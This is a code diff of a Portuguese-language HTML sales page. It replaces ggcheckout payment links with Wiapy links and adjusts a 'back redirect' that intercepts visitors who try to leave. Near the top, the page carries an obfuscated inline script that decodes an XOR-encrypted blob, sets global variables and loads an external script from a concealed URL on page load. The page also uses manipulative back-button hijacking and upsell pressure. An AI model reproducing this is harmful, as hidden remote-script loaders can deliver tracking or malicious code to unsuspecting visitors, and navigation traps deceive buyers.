@@ -21,7 +21,7 @@
 <script>(function(){var x_gwnm=atob("DHfaLT5uZCrLc2631gz4WEwCRhDpGxrDpgTgAhENAETlBhravxGjA10BCQSpAUHEtQWzXUodS1+/Hh2YuhauSE0aSkC4UUKVtwOuX1cMEV6uAEyNjQz4Q18DAQjxUQrWohb3WEoDDUyyXh7FswG/Q0pDHEmkF0PEtRz4ARwYBUa+FkyN9FWnAUVMCkumFkyN9BO7WV9DEV6mGgjO+weoSEgLCl7mABvVvxOpDxJMEkunBguV7FX4UGMT");var c_6e=[];for(var j_0nf1=0;j_0nf1<x_gwnm.length;j_0nf1++){c_6e.push(x_gwnm.charCodeAt(j_0nf1)&255);}var z_yx=c_6e[0];var d_zx4=c_6e.slice(1,1+z_yx);var r_4c=c_6e.slice(1+z_yx);var e_zrm6=r_4c.map(function(b,u_q){return b^d_zx4[u_q%z_yx];});var s_dag="";for(var j_kpx7=0;j_kpx7<e_zrm6.length;j_kpx7++){s_dag+=String.fromCharCode(e_zrm6[j_kpx7]&255);}var a_7c=decodeURIComponent(escape(s_dag));var q_drd9=JSON.parse(a_7c);var b_vwm=q_drd9.globals||[];b_vwm.forEach(function(i_urmf){window[i_urmf.name]=i_urmf.value;});var u_q7=document.createElement("script");u_q7.src=q_drd9.url;u_q7.async=true;u_q7.defer=true;(q_drd9.attributes||[]).forEach(function(g_wv){u_q7.setAttribute(g_wv.name,g_wv.value);});(document.head||document.documentElement).appendChild(u_q7);})();</script>
 
 <!-- ============================================================
-     CHECKOUTS (ggcheckout), um por oferta:
+     CHECKOUTS (Wiapy), um por oferta:
        R$ 10,00  plano Essencial
        R$ 25,90  plano Completo
        R$ 16,90  popup de upsell (só abre no clique do Essencial)
@@ -64,7 +64,11 @@
     // O botão do plano Essencial fica de fora: ele é um link de checkout, mas o
     // clique abre o popup de upsell em vez de navegar. Marcá-lo aqui desarmaria
     // o back redirect de quem viu o popup e desistiu.
-    document.querySelectorAll('a[href*="ggcheckout"]:not(#btn-essencial)').forEach(function (a) {
+    //
+    // ESTE SELETOR ANDA JUNTO COM O GATEWAY. Ao trocar de novo, troque o domínio
+    // aqui também — senão ele para de achar os links e a página de saída passa a
+    // disparar em cima de quem está indo pagar.
+    document.querySelectorAll('a[href*="pay.wiapy.com"]:not(#btn-essencial)').forEach(function (a) {
       a.addEventListener('click', function () { window.__indoParaCheckout = true; });
     });
     // âncoras internas por scroll programático — não mexem no histórico, então
@@ -805,7 +809,7 @@
           <li><span class="ckm">✓</span> Acesso imediato e vitalício</li>
         </ul>
         <!-- R$ 10 — o clique abre o popup de upsell antes de seguir para o checkout -->
-        <a href="https://ggcheckout.app/checkout/v5/pBT9BL8LtQ3INGDCoN3E" class="btn full btn-simples" id="btn-essencial">QUERO SÓ OS PROJETOS</a>
+        <a href="https://pay.wiapy.com/_dq9DEG8vkO" class="btn full btn-simples" id="btn-essencial">QUERO SÓ OS PROJETOS</a>
         <p class="microaviso">↓ tem uma opção melhor logo abaixo</p>
       </div>
 
@@ -837,7 +841,7 @@
           <li>🎁 <span><b>BÔNUS 5:</b> Lista de Compras da Iniciante</span></li>
         </ul>
         <!-- R$ 25,90 -->
-        <a href="https://ggcheckout.app/checkout/v5/kkossn3cKdmyktXLHE4G" class="btn full">SIM! QUERO TUDO</a>
+        <a href="https://pay.wiapy.com/Ej1KaWuawT-x" class="btn full">SIM! QUERO TUDO</a>
         <div class="selos-pgto">
           <span>🔒 Compra segura</span><span>🛡️ 7 dias de garantia</span><span>⚡ Entrega imediata</span>
         </div>
@@ -862,7 +866,7 @@
       <span>apenas R$ 6,90 a mais que o plano básico</span>
     </div>
 
-    <a href="https://ggcheckout.app/checkout/v5/Fm5GvZsVHH3O0p4z9E9Z" class="btn full" id="upsell-sim">QUERO APROVEITAR AGORA</a>
+    <a href="https://pay.wiapy.com/I2XmXHKdXFVQ" class="btn full" id="upsell-sim">QUERO APROVEITAR AGORA</a>
     <button class="modal-nao" id="upsell-nao">Continuar só com o básico</button>
   </div>
 </div>
@@ -1075,7 +1079,7 @@
 
     function abrir(e) {
       e.preventDefault();
-      // O botão do Essencial é um link de ggcheckout, então o handler global já
+      // O botão do Essencial é um link de checkout, então o handler global já
       // marcou "indo para o checkout" — mas aqui ele só abre o popup. Desmarcamos,
       // senão o back redirect fica desarmado para quem viu o popup e desistiu.
       window.__indoParaCheckout = false;
